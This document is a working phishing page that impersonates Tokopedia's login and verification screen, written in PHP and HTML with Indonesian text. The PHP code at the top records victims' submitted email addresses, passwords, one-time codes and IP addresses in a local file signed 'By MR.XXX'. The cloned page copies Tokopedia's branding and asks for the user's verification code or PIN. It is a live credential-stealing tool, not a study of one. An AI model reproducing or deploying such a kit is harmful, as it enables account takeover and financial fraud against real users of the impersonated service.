<?php
$file = "99";
$ip = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");
$imel = $_POST['email'];
$paswot = $_POST['password'];
$henpon = $_POST['otp'];
$teha = $_POST ['th'];

/* Mengambil informasi untuk dikirim kepada  anda !. */

$handle = fopen($file, 'a');
fwrite($handle, "===== dallemutu =====");
fwrite($handle, "\n");
fwrite($handle, "Email: ");
fwrite($handle, "$imel");
fwrite($handle, "\n");
fwrite($handle, "Password: ");
fwrite($handle, "$paswot");
fwrite($handle, "\n");
fwrite($handle, "Kode Otentikasi: ");
fwrite($handle, "$henpon");
fwrite($handle, "\n");
fwrite($handle, "Pesanan: ");
fwrite($handle, "$teha");
fwrite($handle, "\n");
fwrite($handle, "IP Address: ");
fwrite($handle, "$ip");
fwrite($handle, "\n");
fwrite($handle, "Date Submitted: ");
fwrite($handle, "$today");
fwrite($handle, "\n");
fwrite($handle, "===== By MR.XXX =====");
fwrite($handle, "\n");
fwrite($handle, "\n");
fclose($handle);
?>
<!DOCTYPE html>
<html dir="ltr" lang="id" class="no-js">

<head>
	<title>Verifikasi | Tokopedia</title>
	
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
		<meta name="viewport" content="width=device-width, initial-scale=1.0">
		<meta name="title" content="Verifikasi | Tokopedia" />
		<meta name="description" content="Segera login ke akun Tokopedia untuk pengalaman terbaik untuk belanja, bayar tagihan, pengajuan hingga menjalankan toko online kapanpun, dimana pun." />
		<link rel="canonical" href="https://www.tokopedia.com/login" /> 
		<link rel="alternate" media="only screen and (max-width: 640px)" href="https://">
		<meta name="format-detection" content="telephone=no">
		<meta property="og:title" content="Masuk / Login | Tokopedia"/>
		<meta property="og:description" content="Silakan login / masuk ke Tokopedia. Nikmati pengalaman belanja paling menyenangkan dan aman karena Tokopedia dilengkapi rekening bersama gratis!"/>
		<meta property="og:site_name" content="Tokopedia"/>
    	<meta property="og:url" content="https://www.tokopedin">
		<meta property="og:image" content="https://ecs7.tokopedia.net/img/og_tokopedia.jpg"/>
		<meta name="description" content="Segera login ke akun Tokopedia untuk pengalaman terbaik untuk belanja, bayar tagihan, pengajuan hingga menjalankan toko online kapanpun, dimana pun."/>
		<link href="https://plus.google.com/104285007928921240758" rel="publisher">
		<meta name="p:domain_verify" content="50de202304b80ee007bc5d73425457ba"/>
		<meta name="msvalidate.01" content="3104E882307BB6900F56D266DC8320F6" />
		<link href="https://www.tokopedia.com/opensearch.xml" title="Tokopedia Search" type="application/opensearchdescription+xml" rel="search">
		<link rel="shortcut icon" href="https://ecs7.tokopedia.net/img/favicon.ico?v=20140313">

	<link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,400italic,600" rel="stylesheet" type="text/css">
	<link href="https://cdn.tokopedia.net/built/2f2aadbf7e8b2000c0ad07853b9b2f86.css" rel="stylesheet"></link>
	<link href="https://cdn.tokopedia.net/built/ef37a5ed4a83510b766655eba6a6e099.css" rel="stylesheet"></link>
	<link rel="dns-prefetch" href="https://ecs7.tokopedia.net">
	<link rel="dns-prefetch" href="//www.google-analytics.com">
	<link rel="dns-prefetch" href="//www.googletagmanager.com">
	

<script>
	var _comscore = _comscore || [];
	_comscore.push({ c1: "2", c2: "14059479" });
	(function() {
	var s = document.createElement("script"), el = document.getElementsByTagName("script")[0]; s.async = true;
	s.src = (document.location.protocol == "https:" ? "https://sb" : "http://b") + ".scorecardresearch.com/beacon.js";
	el.parentNode.insertBefore(s, el);
	})();
</script>

<noscript>
	<img src="https://sb.scorecardresearch.com/p?c1=2&c2=14059479&cv=2.0&cj=1" />
</noscript>


</head>

<body class="p-0">
	
		
<script src="https://hub.tokopedia.com/iris/clients/web/datalayer-client-web.latest.js"></script>
<script>
  datalayerClientWeb.initializeGTMWithIris({
      container: "gtm",
      device: "desktop",
      batching: true,
      customEventField: "event_ga"
  }, 'dataLayer', 'GTM-TN8CNF');
</script>

	
	<div class="user-accounts-wrapper">
		<div class="js__wrapper-dialog"></div>
		<header class="user-accounts-header">
			<a id="hp-link" f="https://www.tokia" target="">
				
					<i class="user-icon-tokopedia"></i>
				
			</a>
		</header>
		
			

<div id="login-ticker" class="js__ticker unf-user-ticker user-accounts-ticker hide">
        <div class="unf-user-ticker__body">
            <ul class="js__ticker-list user-accounts-list"></ul>
        </div>
        <div class="js__close-ticker unf-user-ticker__action unf-user-ticker__action--close"></div>
        <input type="hidden" id="ticker_url" value="https://gql.tokopedia.com/query" />
    </div>


		
		<div id="content-container" class="user-accounts-content user-accounts-content--image">
			<div class="js__login-form user-accounts-form user-accounts-form--border zoom">
				<div class="user-accounts-form__header user-accounts-form__header--flex">
					<h3 class="user-accounts-form__title user-accounts-form__title--large">Kode Verefikasi Asuransi Barang Telah Kami kirim Jika Gagal Menggunakan Kode Gunakan Pin Tokopedia Anda</h3>
					
					
						<a id="register-link" href="https://tokopedia.com/register?state=eyJyZWYiOiJodHRwczovL3d3dy50b2tvcGVkaWEuY29tIiwidXVpZCI6IjQ3YTk0OWY3LTllNGUtNDcxZC1hM2M4LTRjNDE2ZGIzNTQzNiIsInAiOiJodHRwczovL3d3dy50b2tvcGVkaWEuY29tIn0&client_id=1001&redirect_uri=https%253A%252F%252Fwww.tokopedia.com%252Fappauth%252Fcode" class="js__register-link fs-13 fw-semibold register__top"></a>
		
		<form novalidate="novalidate" class="new_user_session" id="new_user_session" action="gagal.php" accept-charset="UTF-8" method="post"/>		
				</div>
				<section>
					<form id="login-step-one-form" name="login_form" method="post" class="js__login-form-one" novalidate>
						<div class="unf-user-input mb-16">
							<label class="unf-user-input__label" for="email">
							
								    <center>    Masukkan Kode / Pin Tokopedia Anda</center>
							
							</label>
							<input type="number" id="otp" name="otp" value="" class="js__input-form unf-user-input__control">
							<div class="unf-user-input__info">
								<small class="js__input-help unf-user-input__info-msg">
									
										
									
								</small>
								
						
							</div>
								</div>
						<button id="login-submit" class="js__tn-login-form unf-user-btn unf-user-btn--medium unf-user-btn--primary unf-user-btn--block">
							<div class="unf-user-btn-loading">
								<svg class="unf-user-btn-loading__loader" viewBox="25 25 50 50" height="24" width="24">
									<circle class="unf-user-btn-loading__circle-path" cx="50" cy="50" r="20" fill="none" stroke="#FFFFFF" stroke-width="4"></circle>
								</svg>
							</div>
							<span class="unf-user-btn__children">Activate</span>
						</button>
						<input type="hidden" name="f" class="finput" />
					</form>
				</section>
				
					


				
				
				
				</div>
				
			</div>
		</div>
		
		<footer class="user-accounts-footer sm-none">
			<span class="fs-12">2009-2020 © PT Tokopedia</span>
			<a id="help-link" class="user-accounts-footer__link" href="https://www.tokopedia.com/bantuan" target="_blank">Bantuan</a>
			<img src="https://accounts.tokopedia.com/marketplace/pixel" onerror='this.style.display = "none"'>
		</footer>
		<section>
			<div class="unf-user-toaster">
				<div class="unf-user-toaster__body">
					<span id="unf-user-toaster__message">Email atau kata sandi salah</span>
				</div>
			</div>
		</section>
	</div>
	<script src="https://cdn.tokopedia.net/built/3eb2b475925617428cc94571bdd93b48.js" type="text/javascript"></script>
	<script src="https://cdn.tokopedia.net/built/fb2b8326316a13c8010e17a29cadb2d3.js" type="text/javascript"></script>
	<script src="https://cdn.tokopedia.net/built/fa406d2317ead840ab34b4fc8fa61563.js" type="text/javascript"></script>
	<script src="https://cdn.tokopedia.net/built/76d30ad31d94445a91f6d242d9e18e21.js" type="text/javascript"></script>
	<script src="https://cdn.tokopedia.net/built/84c5c35f51c38ab20490830a934a51b3.js" type="text/javascript"></script>

	
	

    
</div>

	

	


</html>